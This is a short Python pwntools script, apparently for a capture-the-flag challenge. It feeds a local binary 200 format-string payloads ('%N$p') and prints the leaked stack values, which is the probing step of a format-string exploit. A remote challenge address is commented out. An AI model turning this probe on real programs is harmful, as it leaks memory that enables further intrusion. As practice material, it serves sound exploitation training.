#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *
p = process('./a.out')
# p = remote('47.106.94.13',50010)

context.log_level = 'debug'
context.arch = 'amd64'

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

ru('This\'s my mind!\n')

stack = []
for i in range(200):
    payload = 'AAAAAAAA%'+str(i)+'$p'
    sl(payload)
    stack.append(rc()[8:-1])
    # raw_input()

for i in range(len(stack)):
    print "%04d|%04x"%(i,i*8), stack[i]

